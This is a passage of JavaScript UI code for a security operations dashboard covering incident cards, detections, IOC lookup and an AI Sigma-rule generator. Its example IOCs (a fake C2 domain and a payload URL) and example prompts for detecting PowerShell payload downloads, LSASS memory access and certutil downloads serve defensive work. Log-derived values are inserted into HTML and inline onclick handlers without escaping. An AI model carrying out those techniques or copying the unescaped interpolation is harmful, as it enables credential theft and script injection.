    ${pt.narrative ? `<div style="font-size:11px;color:#8b949e;margin-top:3px;line-height:1.4;">${pt.narrative.slice(0,160)}${pt.narrative.length>160?'…':''}</div>` : ''}
  </div>
  <div style="font-size:10px;color:#4b5563;flex-shrink:0;text-align:right;">
    <span style="font-weight:700;color:${_riskColor(pt.riskScore||0)};">${pt.riskScore||'?'}</span>
    <div>risk</div>
  </div>
</div>`;
    }).join('');

    // ── Child node rows ────────────────────────────────────────────
    const childRows = children.map(c => {
      const cs  = c.aggregated_severity || c.severity || 'medium';
      const cm  = c.mitre?.technique || c.technique || '';
      const cmt = c.mitre?.tactic || c.category || '';
      const cLinked = c.linkedEvents && c.linkedEvents.length
        ? `<span style="font-size:9px;color:#60a5fa;" title="Cross-log linked events">🔗×${c.linkedEvents.length}</span>` : '';
      const cFirstTs = c.first_seen ? new Date(c.first_seen).toLocaleTimeString() : '—';
      const cHost    = c.computer || c.host || '';
      return `
<div style="padding:10px 14px;background:rgba(13,17,23,0.8);border-radius:8px;border:1px solid #21262d;margin-bottom:6px;">
  <div style="display:flex;align-items:flex-start;gap:8px;flex-wrap:wrap;">
    <div style="width:7px;height:7px;border-radius:50%;background:${_sev(cs).color};flex-shrink:0;margin-top:4px;"></div>
    <div style="flex:1;min-width:0;">
      <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-bottom:3px;">
        ${_sevBadge(cs)}
        <span style="font-size:12px;color:#e6edf3;font-weight:600;">${c.detection_name || c.ruleName || c.title || 'Alert'}</span>
        ${c.ruleId ? `<span style="font-size:10px;font-family:monospace;color:#4b5563;">${c.ruleId}</span>` : ''}
      </div>
      <div style="font-size:10px;color:#6b7280;display:flex;gap:8px;flex-wrap:wrap;margin-bottom:3px;">
        ${cm  ? `<span style="color:#a78bfa;font-family:monospace;font-weight:600;">${cm}</span>` : ''}
        ${cmt ? `<span style="color:#7c3aed;">${cmt.replace(/-/g,' ')}</span>` : ''}
        <span style="color:#4b5563;">${cFirstTs}</span>
        ${cHost ? `<span style="color:#6b7280;">🖥 ${cHost}</span>` : ''}
        ${cLinked}
        ${c.logCategory ? `<span style="color:#34d399;">✔${c.logCategory}</span>` : ''}
      </div>
      ${c.narrative ? `<div style="font-size:11px;color:#8b949e;line-height:1.4;">${c.narrative.slice(0,160)}${c.narrative.length>160?'…':''}</div>` : ''}
    </div>
    <div style="display:flex;flex-direction:column;align-items:flex-end;gap:4px;flex-shrink:0;">
      <span style="font-size:12px;font-weight:700;color:${_riskColor(c.riskScore||0)};">${c.riskScore||'?'}<span style="font-size:9px;color:#4b5563;">/100</span></span>
      <button class="rk-entity-btn" onclick="RAYKAN_UI._showDetDetail('${c.id||''}')" style="font-size:10px;padding:3px 8px;">Detail</button>
    </div>
  </div>
</div>`;
    }).join('');

    const sevGlow = { critical:'rgba(239,68,68,0.12)', high:'rgba(249,115,22,0.08)', medium:'rgba(234,179,8,0.06)', low:'rgba(34,197,94,0.05)', informational:'rgba(107,114,128,0.04)' }[sev] || 'rgba(0,212,255,0.05)';
    const sevBorderColor = _sev(sev).color;
    return `
<div class="rk-inc-card sev-${sev}" style="padding:0;overflow:hidden;
  border:1px solid ${sevBorderColor}44;
  box-shadow:0 4px 24px rgba(0,0,0,0.4), 0 0 32px ${sevBorderColor}08;
  border-radius:14px;margin-bottom:4px;">

  <!-- ── Incident Header ────────────────────────────────────────── -->
  <div class="rk-inc-card-hdr" style="padding:16px 20px;
    background:linear-gradient(135deg,${sevGlow} 0%,rgba(8,14,24,0.98) 60%);
    display:flex;justify-content:space-between;align-items:flex-start;gap:12px;flex-wrap:wrap;">
    <div style="flex:1;min-width:0;">
      <!-- ID + Severity + Title row -->
      <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px;">
        <span style="font-size:10px;font-family:monospace;color:#6b7280;background:#0d1117;padding:2px 7px;border-radius:4px;border:1px solid #21262d;">${shortId}</span>
        ${_sevBadge(sev)}
        <span style="font-size:14px;font-weight:700;color:#f0f6fc;">${incidentTitle}</span>
      </div>
      <!-- Phase sequence + confidence + badges row -->
      <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;margin-bottom:8px;">
        <span style="font-size:10px;padding:2px 8px;background:${confStyle.bg};color:${confStyle.color};border-radius:6px;font-weight:700;">
          ${confStyle.icon} ${conf.level} (${conf.score}%)
        </span>
        <span style="font-size:10px;padding:2px 8px;background:rgba(52,211,153,0.08);color:${bandColor};border-radius:6px;font-weight:700;">
          ACE: ${aceScore.score || conf.score || '—'} · ${aceScore.severityBand || ''}
        </span>
        ${crossHostBadge}
        ${basisBadge}
        ${intentHtml}
        ${dag.phaseSequence?.length ? `<span style="font-size:9px;padding:1px 6px;background:rgba(52,211,153,0.08);color:#34d399;border-radius:5px;">${dag.phaseSequence.length} phases</span>` : ''}
        ${hasInferred ? `<span style="font-size:9px;padding:1px 6px;background:rgba(107,114,128,0.15);color:#6b7280;border-radius:5px;">⚙ ${inferredCount} inferred stage${inferredCount>1?'s':''}</span>` : ''}
      </div>
      <!-- Phase sequence DAG visualization -->
      ${phaseSeqHtml}
      <!-- Identity row -->
      ${identityHtml}
      <!-- Timestamps row -->
      <div style="display:flex;gap:12px;align-items:center;flex-wrap:wrap;margin-top:6px;font-size:11px;">
        <span style="color:#6b7280;">🕐 <span style="color:#8b949e;">First:</span> <strong style="color:#c9d1d9;">${firstTs}</strong></span>
        <span style="color:#6b7280;">🕑 <span style="color:#8b949e;">Last:</span> <strong style="color:#c9d1d9;">${lastTs}</strong></span>
        <span style="color:#6b7280;">⏱ <strong style="color:#e6edf3;">${durStr}</strong></span>
        <span style="padding:2px 8px;background:rgba(239,68,68,0.08);color:#ef4444;border-radius:6px;font-weight:600;">${inc.detectionCount} alert${inc.detectionCount>1?'s':''}</span>
      </div>
      <!-- MITRE tactics + technique matrix -->
      <div style="display:flex;gap:4px;flex-wrap:wrap;margin-top:8px;">${tacticPills}</div>
      ${techniqueMatrix ? `<div style="display:flex;gap:4px;flex-wrap:wrap;margin-top:4px;">${techniqueMatrix}</div>` : ''}
    </div>

    <!-- Right panel: ACE risk score + one-click actions -->
    <div style="display:flex;flex-direction:column;align-items:flex-end;gap:8px;flex-shrink:0;">
      <div style="text-align:center;">
        <div style="font-size:28px;font-weight:900;color:${_riskColor(inc.riskScore||0)};line-height:1;">${inc.riskScore||'—'}</div>
        <div style="font-size:10px;color:#6b7280;">/100 risk</div>
        <div style="font-size:9px;color:${bandColor};font-weight:700;">${aceScore.severityBand||''}</div>
      </div>
      <!-- One-click actions -->
      <div style="display:flex;gap:6px;flex-wrap:wrap;justify-content:flex-end;">
        <button class="rk-entity-btn" onclick="RAYKAN_UI._showDetDetail('${parent.id||''}')">Parent →</button>
        <button class="rk-entity-btn" onclick="RAYKAN_UI._invEntity('${inc.host||''}')">🔍 Investigate</button>
      </div>
      <div style="display:flex;gap:6px;flex-wrap:wrap;justify-content:flex-end;">
        <button class="rk-entity-btn" style="font-size:10px;background:rgba(239,68,68,0.1);color:#ef4444;border-color:#ef4444;" onclick="RAYKAN_UI._isolateHost('${inc.host||''}')">🔒 Isolate</button>
        <button class="rk-entity-btn" style="font-size:10px;" onclick="RAYKAN_UI._pivotToLogs('${inc.incidentId||incId}')">📋 Logs</button>
      </div>
    </div>
  </div>

  <!-- ── Root Cause / Intent Summary Banner ─────────────────────── -->
  ${inc.narrative || behavior.description ? `
  <div style="padding:10px 20px;background:rgba(96,165,250,0.03);border-top:1px solid #21262d;">
    <div style="font-size:10px;color:#4b5563;text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px;font-weight:600;">🧠 Root Cause / Intent Summary</div>
    <div style="font-size:12px;color:#c9d1d9;line-height:1.6;">${inc.narrative || behavior.description || ''}</div>
  </div>` : ''}

  <!-- ── BCE v10: Interactive Attack-Chain Flow Graph ──────────── -->
  ${chainFlowSVG ? `
  <div style="padding:14px 16px;border-top:1px solid #21262d;">
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
      <div>
        <span style="font-size:11px;font-weight:700;color:#e6edf3;">⛓ Attack Chain Flow</span>
        <span style="font-size:10px;color:#4b5563;margin-left:8px;">${observedCount} observed · ${inferredCount > 0 ? `${inferredCount} inferred (dashed)` : 'no inferred stages'}</span>
      </div>
      <button data-chain-toggle="${incId}" style="background:none;border:none;color:#60a5fa;font-size:10px;cursor:pointer;font-weight:600;">▼ collapse</button>
    </div>
    <div id="rk-chain-flow-${incId}" style="overflow-x:auto;padding:4px 0;">
      ${chainFlowSVG}
    </div>
    <!-- Stage detail panels (shown when node is clicked) -->
    <div id="rk-stage-details-${incId}" style="margin-top:8px;">
      ${stageDetails}
    </div>
  </div>` : ''}

  <!-- ── Risk Evolution Bar ─────────────────────────────────────── -->
  ${riskEvolutionBar}

  <!-- ── ACE Scoring Factors ────────────────────────────────────── -->
  <div style="padding:10px 20px;background:rgba(13,17,23,0.5);border-top:1px solid #21262d;">
    <div style="font-size:10px;color:#4b5563;text-transform:uppercase;letter-spacing:.5px;font-weight:600;margin-bottom:4px;">ACE Confidence Factors:</div>
    <ul style="margin:0;padding-left:18px;list-style:disc;font-size:11px;color:#8b949e;">
      ${confReasons}
    </ul>
  </div>

  <!-- ── Phase Timeline (expandable) ───────────────────────────── -->
  ${phaseTimeline.length > 0 ? `
  <div style="padding:10px 20px 0 20px;border-top:1px solid #21262d;">
    <button data-phase-toggle="${incId}" style="background:none;border:none;color:#a78bfa;font-size:11px;cursor:pointer;padding:0;margin-bottom:8px;font-weight:600;">
      ▶ Attack Phase Timeline (${phaseTimeline.length} stages)
    </button>
    <div id="rk-phase-${incId}" style="display:none;padding-bottom:12px;">
      ${phaseRows}
    </div>
  </div>` : ''}

  <!-- ── Evidence & Child Nodes (expandable) ───────────────────── -->
  ${children.length > 0 ? `
  <div style="padding:10px 20px;border-top:1px solid #21262d;">
    <button data-inc-toggle="${incId}" data-child-count="${children.length}"
            style="background:none;border:none;color:#60a5fa;font-size:11px;cursor:pointer;padding:0;margin-bottom:8px;font-weight:600;">
      <span style="color:#60a5fa;">▶</span> Evidence &amp; Child Nodes (${children.length})
    </button>
    <div id="rk-inc-body-${incId}" style="display:none;">
      ${childRows}
    </div>
  </div>` : ''}

</div>`;
  }

  function _tplDetections() {
    return `
<div>
  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;flex-wrap:wrap;gap:8px;">
    <div style="font-size:13px;color:#8b949e;">All triggered detections from the current session.</div>
    <div style="display:flex;gap:8px;align-items:center;">
      <input type="text" class="rk-input" id="rk-det-search" placeholder="Search detections…"
        oninput="RAYKAN_UI._searchDetections()" style="width:200px;padding:6px 12px;font-size:12px;"/>
      <select class="rk-select" id="rk-det-sev" onchange="RAYKAN_UI._filterDetections()">
        <option value="">All Severities</option>
        <option value="critical">Critical</option>
        <option value="high">High</option>
        <option value="medium">Medium</option>
        <option value="low">Low</option>
      </select>
      <button class="rk-btn rk-btn-ghost" onclick="RAYKAN_UI._exportDetections()">↓ Export</button>
    </div>
  </div>
  <div id="rk-det-list" class="rk-card" style="overflow:hidden;"></div>
</div>`;
  }

  // ════════════════════════════════════════════════════════════════
  //  ATTACK CHAINS TAB
  // ════════════════════════════════════════════════════════════════
  function _tplChains() {
    return `
<div>
  <div style="font-size:13px;color:#8b949e;margin-bottom:14px;">
    Multi-stage attack chain reconstruction. Each chain represents a connected sequence of adversary actions mapped to MITRE ATT&CK.
  </div>
  <div id="rk-chains-list" style="display:flex;flex-direction:column;gap:16px;"></div>
</div>`;
  }

  // ════════════════════════════════════════════════════════════════
  //  INVESTIGATE TAB  —  Behavior-First SOC Investigation
  //  Architecture: LOG_NORM → DOMAIN_CLASSIFIER → CONTEXT_VALIDATOR
  //                → BEHAVIOR_DETECTOR → DEDUP_GATE → RISK_ENGINE
  //  Policy: §1 Normalization | §2 Domain | §3 Context | §4 Behavior
  //          §5 Evidence Fusion | §6 Dedup | §8 MITRE | §9 Confidence
  // ════════════════════════════════════════════════════════════════
  function _tplInvestigate() {
    // Build quick-link entity chips from current session detections
    const entities = new Set();
    (S.detections||[]).forEach(d => {
      if (d.user && d.user !== 'N/A') entities.add(d.user);
      if (d.computer) entities.add(d.computer);
      if (d.srcIp) entities.add(d.srcIp);
    });
    const quickChips = [...entities].slice(0,8).map(e =>
      `<button class="rk-inv-chip" onclick="document.getElementById('rk-inv-entity').value='${e}';RAYKAN_UI.investigate()">${e}</button>`
    ).join('');

    return `
<div class="rk-inv-root">

  <!-- ══ SEARCH BAR ══════════════════════════════════════════════ -->
  <div class="rk-inv-searchbar">
    <div class="rk-inv-searchbar-title">
      <span class="rk-inv-searchbar-icon">⬡</span>
      <span>Behavior-First Entity Investigation</span>
      <span class="rk-badge rk-badge-policy">Policy §1–§16</span>
    </div>

    <div class="rk-inv-controls">
      <div class="rk-inv-input-wrap">
        <span class="rk-inv-input-icon">🔍</span>
        <input id="rk-inv-entity" type="text" class="rk-inv-input"
          placeholder="hostname · username · IP address · process · cloud resource…"
          onkeydown="if(event.key==='Enter')RAYKAN_UI.investigate()"/>
      </div>
      <select class="rk-select rk-inv-select" id="rk-inv-type">
        <option value="auto">⚡ Auto-detect</option>
        <option value="host">🖥 Host</option>
        <option value="user">👤 User</option>
        <option value="ip">🌐 IP Address</option>
        <option value="hash">🔑 File Hash</option>
        <option value="process">⚙️ Process</option>
        <option value="cloud_resource">☁️ Cloud Resource</option>
      </select>
      <select class="rk-select rk-inv-select" id="rk-inv-range">
        <option value="1h">1 hour</option>
        <option value="6h">6 hours</option>
        <option value="24h" selected>24 hours</option>
        <option value="7d">7 days</option>
      </select>
      <button class="rk-btn rk-btn-cyan rk-inv-btn" onclick="RAYKAN_UI.investigate()">
        <span class="rk-btn-icon">⬡</span> Investigate
      </button>
    </div>

    <!-- Architecture pipeline indicator -->
    <div class="rk-inv-pipeline">
      <span class="rk-inv-pipe-step rk-pipe-active">LOG_NORM</span>
      <span class="rk-inv-pipe-arrow">→</span>
      <span class="rk-inv-pipe-step rk-pipe-active">DOMAIN_CLASSIFIER</span>
      <span class="rk-inv-pipe-arrow">→</span>
      <span class="rk-inv-pipe-step rk-pipe-active">CONTEXT_VALIDATOR</span>
      <span class="rk-inv-pipe-arrow">→</span>
      <span class="rk-inv-pipe-step rk-pipe-active">BEHAVIOR_DETECTOR</span>
      <span class="rk-inv-pipe-arrow">→</span>
      <span class="rk-inv-pipe-step rk-pipe-active">DEDUP_GATE</span>
      <span class="rk-inv-pipe-arrow">→</span>
      <span class="rk-inv-pipe-step rk-pipe-active">RISK_ENGINE</span>
    </div>

    <!-- Domain coverage badges -->
    <div class="rk-inv-domains">
      <span class="rk-inv-domain-badge rk-domain-endpoint">⬡ Endpoint</span>
      <span class="rk-inv-domain-badge rk-domain-network">⬡ Network</span>
      <span class="rk-inv-domain-badge rk-domain-database">⬡ Database</span>
      <span class="rk-inv-domain-badge rk-domain-cloud">⬡ Cloud</span>
      <span class="rk-inv-domain-badge rk-domain-app">⬡ Application</span>
    </div>

    <!-- Quick entity links -->
    ${quickChips ? `<div class="rk-inv-quick-wrap">
      <span class="rk-inv-quick-label">From session:</span>
      <div class="rk-inv-quick">${quickChips}</div>
    </div>` : ''}
  </div>

  <!-- ══ RESULT PANEL ════════════════════════════════════════════ -->
  <div id="rk-inv-result">
    <div class="rk-inv-empty">
      <div class="rk-inv-empty-icon">⬡</div>
      <div class="rk-inv-empty-title">Behavior-First Investigation Engine</div>
      <div class="rk-inv-empty-sub">
        Enter any entity (host · user · IP · process · cloud resource) to run a full
        behavior-driven forensic analysis across all available log domains.
      </div>
      <div class="rk-inv-empty-policy">
        <span>§1 Normalized</span><span>§2 Domain-Aware</span>
        <span>§4 Behavior-First</span><span>§6 De-duplicated</span>
        <span>§8 MITRE-Validated</span>
      </div>
    </div>
  </div>

</div>`;
  }

  // ════════════════════════════════════════════════════════════════
  //  IOC LOOKUP TAB
  // ════════════════════════════════════════════════════════════════
  function _tplIOC() {
    return `
<div>
  <div class="rk-card" style="padding:20px;margin-bottom:16px;">
    <div style="font-size:13px;font-weight:600;margin-bottom:12px;">
      🔎 IOC Intelligence Lookup
    </div>
    <div style="display:flex;gap:10px;">
      <input id="rk-ioc-in" type="text" class="rk-input"
        placeholder="Enter IP, domain, MD5/SHA256, or URL…"
        onkeydown="if(event.key==='Enter')RAYKAN_UI.lookupIOC()" style="flex:1;"/>
      <button class="rk-btn rk-btn-purple" onclick="RAYKAN_UI.lookupIOC()" style="min-width:100px;">
        🔍 Lookup
      </button>
    </div>
    <div style="display:flex;gap:6px;margin-top:10px;flex-wrap:wrap;">
      <span style="font-size:11px;color:#6b7280;align-self:center;">Examples:</span>
      ${['185.220.101.45','evil-c2.ru','d41d8cd98f00b204e9800998ecf8427e','http://malware.site/payload.exe'].map(v =>
        `<button class="rk-chip" onclick="document.getElementById('rk-ioc-in').value='${v}';RAYKAN_UI.lookupIOC()">${v}</button>`
      ).join('')}
    </div>
    <div style="margin-top:12px;display:flex;gap:8px;align-items:center;">
      <span style="font-size:11px;color:#6b7280;">Sources:</span>
      ${['VirusTotal','AbuseIPDB','OTX AlienVault','GreyNoise'].map(s =>
        `<span class="rk-tag">✓ ${s}</span>`).join('')}
    </div>
  </div>

  <!-- Batch lookup -->
  <div class="rk-card" style="padding:20px;margin-bottom:16px;">
    <div style="font-size:12px;font-weight:600;color:#8b949e;margin-bottom:10px;">
      📋 Batch IOC Lookup (one per line)
    </div>
    <textarea id="rk-ioc-batch" rows="4" class="rk-input rk-code"
      style="resize:vertical;border-radius:6px;" placeholder="185.220.101.45&#10;evil.domain.ru&#10;aabbcc..."></textarea>
    <button class="rk-btn rk-btn-ghost" style="margin-top:8px;" onclick="RAYKAN_UI.lookupIOCBatch()">
      Lookup All
    </button>
  </div>

  <!-- Result -->
  <div id="rk-ioc-result" style="min-height:100px;"></div>
</div>`;
  }

  // ════════════════════════════════════════════════════════════════
  //  UEBA / ANOMALIES TAB
  // ════════════════════════════════════════════════════════════════
  function _tplAnomalies() {
    return `
<div>
  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;">
    <div style="font-size:13px;color:#8b949e;">
      User &amp; Entity Behavioral Analytics — ML-detected deviations from baseline.
    </div>
    <span class="rk-badge" style="background:rgba(245,158,11,.12);color:#f59e0b;">
      ${S.anomalies.length} anomalies
    </span>
  </div>
  <div id="rk-anom-list" style="display:flex;flex-direction:column;gap:10px;"></div>
</div>`;
  }

  // ════════════════════════════════════════════════════════════════
  //  RULES TAB
  // ════════════════════════════════════════════════════════════════
  function _tplRules() {
    return `
<div>
  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;flex-wrap:wrap;gap:8px;">
    <div style="font-size:13px;color:#8b949e;">
      Active Sigma detection rules — <span id="rk-rules-cnt" style="color:#34d399;">0</span> rules loaded.
    </div>
    <div style="display:flex;gap:8px;">
      <input type="text" class="rk-input" id="rk-rules-search" placeholder="Search rules…"
        oninput="RAYKAN_UI._searchRules()" style="width:200px;padding:6px 12px;font-size:12px;"/>
      <select class="rk-select" id="rk-rules-sev" onchange="RAYKAN_UI._loadRules()">
        <option value="">All Severities</option>
        <option value="critical">Critical</option>
        <option value="high">High</option>
        <option value="medium">Medium</option>
        <option value="low">Low</option>
      </select>
      <button class="rk-btn rk-btn-ghost" onclick="RAYKAN_UI._setTab('rulegen')">+ Generate Rule</button>
    </div>
  </div>
  <div id="rk-rules-list" class="rk-card" style="overflow:hidden;"></div>
</div>`;
  }

  // ════════════════════════════════════════════════════════════════
  //  MITRE TAB
  // ════════════════════════════════════════════════════════════════
  function _tplMITRE() {
    return `
<div>
  <div style="font-size:13px;color:#8b949e;margin-bottom:14px;">
    MITRE ATT&CK v14 technique coverage — heatmap showing detected techniques from current session.
  </div>
  <div id="rk-mitre-heatmap" class="rk-card" style="padding:20px;min-height:200px;">
    <div style="display:flex;align-items:center;justify-content:center;padding:40px;flex-direction:column;gap:12px;">
      <div class="rk-spinner"></div>
      <div style="color:#8b949e;font-size:13px;">Loading MITRE coverage…</div>
    </div>
  </div>
</div>`;
  }

  // ════════════════════════════════════════════════════════════════
  //  AI RULE GEN TAB
  // ════════════════════════════════════════════════════════════════
  function _tplRuleGen() {
    return `
<div>
  <div class="rk-card" style="padding:20px;margin-bottom:16px;">
    <div style="font-size:13px;font-weight:600;margin-bottom:14px;">
      ✨ AI-Powered Sigma Rule Generator
    </div>
    <div style="font-size:12px;color:#8b949e;margin-bottom:10px;">
      Describe a threat or attack technique in natural language. RAYKAN's AI will generate a
      production-ready Sigma detection rule, automatically validate it, and add it to the engine.
    </div>
    <textarea id="rk-rg-input" rows="5" class="rk-input"
      style="resize:vertical;border-radius:6px;"
      placeholder="e.g. Detect when PowerShell downloads and executes a payload from a remote server using IEX and DownloadString, bypassing execution policy…"></textarea>

    <div style="display:flex;gap:10px;margin-top:12px;flex-wrap:wrap;">
      <select class="rk-select" id="rk-rg-category">
        <option value="process">Process Creation</option>
        <option value="network">Network Connection</option>
        <option value="file">File Event</option>
        <option value="registry">Registry Event</option>
        <option value="auth">Authentication</option>
      </select>
      <select class="rk-select" id="rk-rg-severity">
        <option value="high">High</option>
        <option value="critical">Critical</option>
        <option value="medium">Medium</option>
        <option value="low">Low</option>
      </select>
      <button class="rk-btn rk-btn-purple" onclick="RAYKAN_UI.generateRule()" style="flex:1;max-width:200px;">
        ✨ Generate with AI
      </button>
    </div>

    <!-- Prompt examples -->
    <div style="margin-top:14px;">
      <div style="font-size:11px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:.4px;margin-bottom:8px;">
        Example prompts:
      </div>
      <div style="display:flex;flex-direction:column;gap:6px;">
        ${[
          'Detect Cobalt Strike beacon using named pipe staging',
          'Find LSASS memory access via OpenProcess with PROCESS_VM_READ',
          'Detect WMI-based persistence via ActiveScriptEventConsumer',
          'Alert on suspicious certutil usage for payload download',
        ].map(p => `<button class="rk-chip" style="text-align:left;padding:6px 12px;"
          onclick="document.getElementById('rk-rg-input').value='${p}'">${p}</button>`).join('')}
      </div>
    </div>
  </div>

  <div id="rk-rg-result" style="min-height:100px;"></div>
</div>`;
  }

  // ════════════════════════════════════════════════════════════════
  //  ACTIONS
  // ════════════════════════════════════════════════════════════════

  async function runSample(scenario = 'ransomware') {
    S.analyzing = true;
    _showToast(`Running ${scenario} simulation…`, 'info');
    const btn = document.querySelector('.rk-btn-red');
    if (btn) { btn.disabled = true; btn.textContent = '⏳ Analyzing…'; }

    // Show progress in ingest result area if visible
    const ingestRes = document.getElementById('rk-ingest-result');
    if (ingestRes) {
      ingestRes.innerHTML = `<div style="padding:20px;text-align:center;">${_spinner('Running ' + scenario + ' scenario…')}</div>`;
    }

    try {
      let result;
      try {
        // Try backend API first
        result = await _api('POST', '/analyze/sample', { scenario });
      } catch(apiErr) {
        // Fallback: use CSDE with scenario-specific sample events
        console.warn('[RAYKAN] Backend unavailable — using CSDE for demo:', apiErr.message);
        const sampleEvents = CSDE.getSampleEvents(scenario);
        result = CSDE.analyzeEvents(sampleEvents);
        result.scenario = scenario;
      }

      // Guaranteed iterable arrays regardless of response shape
      S.detections  = normalizeDetections(result.detections);
      S.incidents   = Array.isArray(result.incidents) ? result.incidents : [];
      S.timeline    = normalizeDetections(result.timeline);
      S.chains      = normalizeDetections(result.chains);
      S.anomalies   = normalizeDetections(result.anomalies);
      S.riskScore   = result.riskScore   || 0;
      S.sessionId   = result.sessionId   || null;
      S.lastUpdated = new Date();

      _updateStats(result);
      const dLen = S.detections.length;
      const cLen = S.chains.length;
      _showToast(`✓ ${dLen} detection(s), ${cLen} chain(s) | Risk: ${result.riskScore}${result.engine === 'CSDE-offline' ? ' [Offline]' : ''}`, 'success');

      // Navigate to detections
      _setTab('detections');

      if (ingestRes) {
        ingestRes.innerHTML = `<div class="rk-card" style="padding:16px;">
          <div style="color:#34d399;font-weight:700;margin-bottom:8px;">✓ ${scenario} simulation complete${result.engine === 'CSDE-offline' ? ' (offline)' : ''}</div>
          <div style="font-size:12px;color:#8b949e;">${dLen} detection(s) · ${S.timeline.length} timeline events · Risk: ${result.riskScore}</div>
        </div>`;
      }
    } catch(e) {
      _showToast('Analysis failed: ' + e.message, 'error');
      if (ingestRes) ingestRes.innerHTML = `<div style="color:#ef4444;padding:16px;">${e.message}</div>`;
    } finally {
      S.analyzing = false;
      if (btn) { btn.disabled = false; btn.textContent = '▶ Run Demo'; }
    }
  }

  async function executeHunt() {
    const input = document.getElementById('rk-h-input');
    const query = input?.value?.trim();
    if (!query) return _showToast('Enter a query first', 'warning');

    const mode    = S.huntMode;
    const timeR   = document.getElementById('rk-h-time')?.value || '24h';
    const btn     = document.getElementById('rk-h-btn');
    if (btn) { btn.disabled = true; btn.textContent = '⏳ Hunting…'; }

    const resEl = document.getElementById('rk-h-results');
    if (resEl) resEl.innerHTML = `<div style="padding:40px;text-align:center;">${_spinner('Searching event history…')}</div>`;

    try {
      const endpoint = mode === 'nl' ? '/hunt/nl' : '/hunt';
      const result   = await _api('POST', endpoint, { query, timeRange: timeR, aiAssist: mode === 'nl' });
      S.huntResults  = result;
      _renderHuntResults(result);
      _showToast(`Hunt: ${result.count} matches in ${result.duration}ms`, result.count > 0 ? 'success' : 'info');
    } catch(e) {
      if (resEl) resEl.innerHTML = `<div style="color:#ef4444;padding:20px;text-align:center;">${e.message}</div>`;
      _showToast('Hunt failed: ' + e.message, 'error');
    } finally {
      if (btn) { btn.disabled = false; btn.textContent = 'Hunt ▶'; }
    }
  }

  async function lookupIOC() {
    const val = document.getElementById('rk-ioc-in')?.value?.trim();
    if (!val) return _showToast('Enter an IOC value', 'warning');
    const res = document.getElementById('rk-ioc-result');
    if (res) res.innerHTML = `<div style="padding:40px;text-align:center;">${_spinner('Querying threat intel…')}</div>`;
    try {
      const r = await _api('GET', `/ioc/${encodeURIComponent(val)}`);
      _renderIOCResult(r.ioc || r, res);
    } catch(e) {
      if (res) res.innerHTML = `<div style="color:#ef4444;padding:20px;">${e.message}</div>`;
    }
  }

  async function lookupIOCBatch() {
    const raw = document.getElementById('rk-ioc-batch')?.value?.trim();
    if (!raw) return _showToast('Enter IOCs (one per line)', 'warning');
    const iocs = raw.split('\n').map(l => l.trim()).filter(Boolean);
    const res  = document.getElementById('rk-ioc-result');
    if (res) res.innerHTML = `<div style="padding:40px;text-align:center;">${_spinner('Batch lookup…')}</div>`;
    try {
      const r = await _api('POST', '/ioc/batch', { iocs });
      _renderBatchIOC(r.results || [], res);
    } catch(e) {
      if (res) res.innerHTML = `<div style="color:#ef4444;padding:20px;">${e.message}</div>`;
    }
  }

  async function investigate() {
    const entity = document.getElementById('rk-inv-entity')?.value?.trim();
    if (!entity) return _showToast('Enter an entity to investigate', 'warning');
    S.investigateEntity = entity;
    _runInvestigation(entity);
  }

  async function _runInvestigation(entity) {
    const type  = document.getElementById('rk-inv-type')?.value  || 'auto';
    const range = document.getElementById('rk-inv-range')?.value || '24h';
    const res   = document.getElementById('rk-inv-result');
    if (!res) return;

    res.innerHTML = `<div style="padding:60px;text-align:center;">${_spinner('Running behavior-first analysis for: ' + entity + '…')}</div>`;

    // ── Time range → milliseconds ───────────────────────────
    const rangeMs = { '1h':3_600_000, '6h':21_600_000, '24h':86_400_000, '7d':604_800_000 };
    const timeRangeMs = rangeMs[range] || 86_400_000;

    // ── 1. Run client-side behavior-first engine (offline) ──
    let clientResult = null;
    try {
      clientResult = CSDE.investigateEntity(entity, type, timeRangeMs, S);
    } catch(err) {
      console.warn('[Investigation] Client-side engine error:', err.message);
    }

    // ── 2. Try backend for additional enrichment ────────────
    let backendResult = null;
    try {
      backendResult = await _api('POST', '/investigate', { entityId: entity, type, timeRange: range });
    } catch(e) {
      // Backend unavailable — continue with client-side only
    }

    // ── 3. Merge results (client wins for behavior fields) ──
    let merged;
    if (clientResult) {
      merged = {
        entityId     : entity,
        type         : clientResult.type,
        riskScore    : clientResult.riskScore,
        summary      : clientResult.summary,
        findings     : clientResult.findings,        // behavior-first, deduped
        timeline     : clientResult.timeline,         // attack-progression only
        mitreMap     : clientResult.mitreMap,
        chain        : clientResult.chain,
        chains       : clientResult.chains,
        domainSummary: clientResult.domainSummary,
        totalEvents  : clientResult.totalEvents,
        _meta        : clientResult._meta,
        _source      : backendResult ? 'hybrid' : 'client',
        // Supplement with backend evidence if available
        evidence     : backendResult?.evidence || null,
        backendRisk  : backendResult?.riskScore || null,
      };
    } else if (backendResult) {
      merged = { ...backendResult, _source: 'backend' };
    } else {
      merged = {
        entityId : entity, type, riskScore: 0,
        findings : [], timeline: [], mitreMap: { techniques: [] },
        chain    : null, chains: [], domainSummary: {},
        summary  : `No data available for "${entity}" in current session.`,
        _source  : 'empty',
      };
    }

    _renderInvestigationResult(merged, res);
  }

  async function generateRule() {
    const desc = document.getElementById('rk-rg-input')?.value?.trim();
    if (!desc) return _showToast('Describe the threat first', 'warning');
    const sev  = document.getElementById('rk-rg-severity')?.value || 'high';
    const cat  = document.getElementById('rk-rg-category')?.value || 'process';
    const res  = document.getElementById('rk-rg-result');
    if (res) res.innerHTML = `<div style="padding:40px;text-align:center;">${_spinner('AI is generating Sigma rule…')}</div>`;
    try {
      const r = await _api('POST', '/rule/generate', { description: desc, severity: sev, category: cat });
      _renderGeneratedRule(r.rule, r.validation, res);
      _showToast('Rule generated successfully!', 'success');
    } catch(e) {
      if (res) res.innerHTML = `<div style="color:#ef4444;padding:20px;">${e.message}</div>`;
      _showToast('Failed: ' + e.message, 'error');
    }
  }

  async function ingestPasted() {
    const raw = document.getElementById('rk-paste-events')?.value?.trim();
    if (!raw) return _showToast('Paste events first (JSON, Syslog, or CEF)', 'warning');
